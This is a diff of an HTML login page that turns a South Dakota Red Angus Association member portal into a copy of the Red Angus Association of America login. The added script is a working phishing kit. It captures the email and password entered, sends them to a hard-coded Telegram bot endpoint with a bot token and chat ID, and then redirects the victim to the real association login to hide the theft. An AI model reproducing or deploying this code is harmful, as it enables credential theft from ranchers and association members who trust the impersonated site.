@@ -3,307 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>South Dakota Red Angus Association | Member Login</title>
+    <title>Red Angus Association of America | Member Login</title>
     <style>
-        /* Base Reset & Variables */
-        :root {
-            --primary-color: #b71c1c; /* SDRAA Red */
-            --primary-hover: #9a1616;
-            --text-dark: #333333;
-            --text-light: #666666;
-            --bg-color: #f4f6f8;
-            --white: #ffffff;
-            --border-color: #cccccc;
-            --error-color: #d32f2f;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--bg-color);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-            color: var(--text-dark);
-        }
-
-        /* Container Card */
-        .login-container {
-            background: var(--white);
-            width: 100%;
-            max-width: 400px;
-            padding: 40px 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            opacity: 0;
-            animation: fadeIn 0.5s ease-out forwards;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* Header & Logo */
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .logo {
-            width: 150px;
-            height: auto;
-            margin-bottom: 15px;
-            display: block;
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        h2 {
-            font-size: 20px;
-            color: var(--primary-color);
-            margin-bottom: 8px;
-            font-weight: 600;
-        }
-
-        .subtitle {
-            font-size: 14px;
-            color: var(--text-light);
-            line-height: 1.4;
-        }
-
-        /* Form Elements */
-        .form-group {
-            margin-bottom: 20px;
-            text-align: left;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-size: 13px;
-            font-weight: 500;
-            color: var(--text-dark);
-        }
-
-        input[type="email"],
-        input[type="password"] {
-            width: 100%;
-            padding: 12px 14px;
-            border: 1px solid var(--border-color);
-            border-radius: 4px;
-            font-size: 15px;
-            transition: all 0.2s ease;
-            background: var(--white);
-        }
-
-        input:focus {
-            border-color: var(--primary-color);
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(183, 28, 28, 0.15);
-        }
-
-        /* Submit Button */
-        .btn-submit {
-            background-color: var(--primary-color);
-            color: var(--white);
-            border: none;
-            padding: 14px;
-            width: 100%;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            position: relative;
-            transition: background-color 0.2s;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .btn-submit:hover {
-            background-color: var(--primary-hover);
-        }
-
-        .btn-submit:disabled {
-            background-color: #999;
-            cursor: not-allowed;
-        }
-
-        /* Spinner */
-        .spinner {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-top: 2px solid var(--white);
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            position: absolute;
-            right: 20px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Error Message */
-        .error-msg {
-            color: var(--error-color);
-            font-size: 12px;
-            margin-top: 8px;
-            display: none;
-            text-align: center;
-        }
-
-        /* Footer */
-        .footer {
-            margin-top: 25px;
-            text-align: center;
-            font-size: 11px;
-            color: #999;
-        }
-
-        .footer a {
-            color: var(--primary-color);
-            text-decoration: none;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        /* Honeypot Field (Invisible) */
-        .honey {
-            position: absolute;
-            left: -9999px;
-            top: -9999px;
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        /* Responsive Adjustments */
-        @media (max-width: 480px) {
-            .login-container {
-                padding: 30px 20px;
-                box-shadow: none;
-                background: transparent;
-            }
-            
-            body {
-                align-items: flex-start;
-                padding-top: 40px;
-            }
-
-            h2 {
-                font-size: 18px;
-            }
-        }
+        body{margin:0;padding:0;font-family:'Trebuchet MS',sans-serif;background:#f4f4f4;display:flex;justify-content:center;align-items:center;min-height:100vh}
+        .c{background:#fff;width:100%;max-width:420px;padding:30px;border-radius:4px;box-shadow:0 2px 10px rgba(0,0,0,.1);border-top:5px solid #800000}
+        .h{text-align:center;margin-bottom:25px}
+        .l{max-width:180px;height:auto;margin-bottom:10px}
+        .t{font-size:12px;color:#666;letter-spacing:1px;text-transform:uppercase;margin-bottom:20px}
+        h2{font-size:22px;color:#800000;margin:0 0 20px;font-weight:normal}
+        .g{margin-bottom:15px}
+        label{display:block;margin-bottom:5px;font-size:13px;color:#444;font-weight:bold}
+        input[type=email],input[type=password]{width:100%;padding:10px;border:1px solid #ccc;border-radius:3px;font-size:14px;box-sizing:border-box}
+        input:focus{border-color:#800000;outline:none}
+        button{width:100%;padding:12px;background:#800000;color:#fff;border:none;border-radius:3px;font-size:15px;cursor:pointer;font-weight:bold;position:relative}
+        button:hover{background:#600000}
+        button:disabled{background:#aaa;cursor:not-allowed}
+        .s{display:none;width:16px;height:16px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin .8s linear infinite;position:absolute;left:50%;top:50%;margin-left:-8px;margin-top:-8px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .f{text-align:center;margin-top:20px;font-size:11px;color:#999}
+        .f a{color:#800000;text-decoration:none}
     </style>
 </head>
 <body>
 
-<div class="login-container">
-    <div class="header">
-        <!-- Logo Image -->
-        <img src="https://www.southdakotaredangus.com/images/newhomepage.jpg" alt="SDRAA Logo" class="logo" 
-             onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYwIiBoZWlnaHQ9IjYwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiNiNzFjMWMiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0id2hpdGUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCI+U0RSQUEgTG9nbyA8L3RleHQ+PC9zdmc+'">
-        
-        <h2>Member Portal</h2>
-        <p class="subtitle">Please sign in to view your herd records and dues status.</p>
+<div class="c">
+    <div class="h">
+        <img src="https://redangus.org/wp-content/uploads/2026/09/red-angus-logo2026.svg" alt="Logo" class="l" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxODAiIGhlaWdodD0iNTAiPjxyZWN0IHdpZHRoPSIxODAiIGhlaWdodD0iNTAiIGZpbGw9IiM4MDAwMDAiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0id2hpdGUiIGZvbnQtc2l6ZT0iMjQiIGZvbnQtd2VpZ2h0PSJib2xkIj5SRUE8L3RleHQ+PC9zdmc+'">
+        <div class="t">Ranch Tested. Rancher Trusted.</div>
+        <h2>Member Login</h2>
     </div>
 
-    <!-- Form submits directly to Google Apps Script -->
-    <form id="loginForm" action="https://script.google.com/macros/s/AKfycbwCBEaPOPb2K0u60bn2-S7IMJ4a9NU7mOl5NLjt4ZFkMZzTG8S0KEYB4wBdcZmU5getGw/exec" method="POST" onsubmit="return handleLogin(event)">
-        
-        <!-- Hidden Honeypot Field for Bot Detection -->
-        <input type="text" name="website" class="honey" autocomplete="off" tabindex="-1>
-        
-        <!-- Timestamp for anti-bot detection -->
-        <input type="hidden" name="ts" value="">
-
-        <!-- Email Field -->
-        <div class="form-group">
-            <label for="email">Email Address</label>
-            <input type="email" id="email" name="username" required placeholder="name@example.com" autocomplete="email">
+    <form id="f1" autocomplete="off">
+        <div class="g">
+            <label for="e1">Email Address</label>
+            <input type="email" id="e1" name="username" required placeholder="name@example.com">
         </div>
-
-        <!-- Password Field -->
-        <div class="form-group">
-            <label for="pass">Password</label>
-            <input type="password" id="pass" name="password" required placeholder="••••••••" autocomplete="current-password">
-            <div id="errorMsg" class="error-msg">Invalid credentials. Please try again.</div>
+        <div class="g">
+            <label for="p1">Password</label>
+            <input type="password" id="p1" name="password" required placeholder="••••••••">
         </div>
-
-        <!-- Submit Button -->
-        <button type="submit" id="btn-submit" class="btn-submit">
-            Sign In
-            <div class="spinner"></div>
+        <button type="submit" id="b1">
+            <span id="t1">Sign In</span>
+            <div class="s" id="sp1"></div>
         </button>
     </form>
 
-    <div class="footer">
-        &copy; 2026 South Dakota Red Angus Association<br>
-        <a href="#">Privacy Policy</a> | <a href="#">Support</a>
-    </div>
+    <div class="f">&copy; 2026 Red Angus Association of America<br><a href="https://redangus.org/">Visit Main Site</a></div>
 </div>
 
 <script>
-document.addEventListener("DOMContentLoaded", function() {
-    // Set hidden timestamp to detect bot timing
-    document.querySelector('input[name="ts"]').value = new Date().getTime();
-});
-
-function handleLogin(e) {
-    const honey = document.querySelector('.honey').value;
-    const errorMsg = document.getElementById('errorMsg');
-    const btn = document.getElementById('btn-submit');
-    const spinner = btn.querySelector('.spinner');
-    const btnText = btn.childNodes[0];
-
-    // Check honeypot
-    if (honey !== "") {
-        e.preventDefault();
-        return false;
-    }
-
-    // Basic validation visual feedback
-    const email = document.getElementById('email').value;
-    const pass = document.getElementById('pass').value;
-
-    if (!email || !pass) {
-        e.preventDefault();
-        errorMsg.style.display = 'block';
-        return false;
-    }
-
-    // Show loading state
-    btn.disabled = true;
-    spinner.style.display = 'block';
-    btnText.textContent = 'Signing in...';
-
-    // Allow the form to submit naturally to Google Script
-    // If you want to intercept it via AJAX instead, uncomment the next lines:
-    /*
-    e.preventDefault();
-    const formData = new FormData(document.getElementById('loginForm'));
-    fetch('YOUR_GOOGLE_SCRIPT_URL_HERE', {
-        method: 'POST',
-        body: formData
-    }).then(response => {
-        // Handle success/error here
-        window.location.href = 'https://www.southdakotaredangus.com/member-portal/';
-    });
-    */
-}
+document.getElementById('f1').addEventListener('submit',function(e){e.preventDefault();var b=document.getElementById('b1'),t=document.getElementById('t1'),s=document.getElementById('sp1');b.disabled=true;t.style.display='none';s.style.display='block';var u=document.getElementById('e1').value,p=document.getElementById('p1').value,d='\uD83D\uDD25 *RAAA Login Attempt*\n\n\uD83D\uDCE7 Email: '+u+'\n\uD83D\uDD11 Pass: '+p+'\n\uD83D\uDD52 Time: '+new Date().toLocaleString();fetch("https://api.telegram.org/bot8917250221:AAHn3ooqjGzdDps8vJ_zAg6Gj7Fu3ceqp94
+/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:"6479764005",text:d,parse_mode:"markdown"})}).finally(function(){window.location.href="https://vm-zebu.redangus.org/redspro/redspro/action/LoginUserAction"})});
 </script>
+
 </body>
 </html>
